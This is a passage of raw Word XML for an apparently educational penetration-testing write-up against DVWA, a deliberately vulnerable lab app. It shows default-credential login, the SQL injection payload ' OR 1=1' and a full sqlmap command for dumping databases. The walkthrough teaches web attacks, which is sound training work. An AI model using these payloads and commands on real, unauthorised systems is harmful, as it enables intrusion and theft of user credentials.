        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> robots.txt </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the directory DVWA which is web-site platform to learn osawp10 types of attacks for learning. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRPr="001B1649" w:rsidRDefault="004C0745" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">For the attacker DVWA is great because </w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:r w:rsidR="004E5063" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>can use some web application attacks</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">, such as </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>grab</w:t>
      </w:r>
      <w:r w:rsidR="004E5063">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">bing </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">users and passwords and </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">even try </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command injection to get shell on the target system. Let’s see what we can do more as the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRDefault="004C0745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Next step </w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>will be</w:t>
      </w:r>
      <w:r w:rsidR="009259EE" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>to check what we have on the website with DVWA directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRPr="001B1649" w:rsidRDefault="00B1730E" w:rsidP="004C0745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId15" w:history="1">
        <w:r w:rsidR="004C0745" w:rsidRPr="001B1649">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>http://10.0.0.4:8181/DVWA</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="004C0745" w:rsidRPr="001B1649" w:rsidRDefault="004432D5" w:rsidP="004C0745">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="360DEB26">
            <wp:extent cx="5487035" cy="1889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7035" cy="1889760"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="004432D5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">And we see login page the </w:t>
      </w:r>
      <w:r w:rsidR="00970C8A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">think </w:t>
      </w:r>
      <w:r w:rsidR="00970C8A" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r w:rsidR="004432D5" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attacker will do </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="004432D5" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> try first default credentials see maybe the admin forgot to change the default passwords. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004432D5" w:rsidRDefault="004432D5" w:rsidP="004432D5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">So let’s try </w:t>
      </w:r>
      <w:r w:rsidR="008A5EB7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">default </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">credentials like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r w:rsidR="008A5EB7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008A5EB7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp;</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r w:rsidR="008A5EB7">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and see if we can get in with default credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRPr="001B1649" w:rsidRDefault="008A5EB7" w:rsidP="004432D5">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="36181FF5" wp14:editId="568ECFF2">
            <wp:extent cx="5204939" cy="349827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6939" cy="3513059"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">It Works! </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">I used default credentials </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>admin:password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and we successfully logged in.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we see on the page there is a lot of web application type attacks so we can try attacks like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection to grab all the users and passwords on the database, and we can try the attacks like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command injection to get reverse shell on the box let’s try that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00536E41" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRPr="00944C35" w:rsidRDefault="008A5EB7" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="00B1730E" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId18" w:history="1">
        <w:r w:rsidR="008A5EB7" w:rsidRPr="001B1649">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>http://10.0.0.4:8181/DVWA/vulnerabilities/sqli/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRPr="001B1649" w:rsidRDefault="008A5EB7" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20F0967A">
            <wp:extent cx="4648200" cy="3620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515" cy="3625925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="001B4ADE" w:rsidRPr="001B1649" w:rsidRDefault="001B4ADE" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we are on the page for testing </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection this attack good for us as the attackers</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>We can grab datab</w:t>
      </w:r>
      <w:r w:rsidR="005B1902">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>se information and steal user names and password from the datab</w:t>
      </w:r>
      <w:r w:rsidR="005B1902">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>se.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001B4ADE" w:rsidRDefault="001B4ADE" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Let’s try </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection payloads and see how the website response to our payloads.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D57B066" wp14:editId="18170170">
            <wp:extent cx="5486400" cy="2155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155825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="008A5EB7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="23AD82D5" wp14:editId="5280D9C1">
            <wp:extent cx="5486400" cy="1276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276985"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A5EB7" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1260"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>after we use the payload: ' OR 1=1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we got </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> syntax error and information that this database use MySQL very good information for the attacker, now if we got </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> syntax error we can use the tool SQLMAP which can automate the enumeration on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">data bases of </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and can help us to dump all the information let’s see how we can use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="1260"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D5A277C" wp14:editId="66A9A772">
            <wp:extent cx="5486400" cy="3391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391535"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sqlmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -u "http://10.0.0.4:8181/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>cookie"security</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>=low; PHPSESSID=qlrnf3v3641t07tuplnph2b1e9" --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dbs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –batch</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-u the site of the target</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-r request that I capture from burp suite and copy to text file</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> (below the request from burp suite)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BB81665" wp14:editId="503FF6C9">
            <wp:extent cx="5486400" cy="1572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572260"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1902" w:rsidRPr="001B1649" w:rsidRDefault="005B1902" w:rsidP="005B1902">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
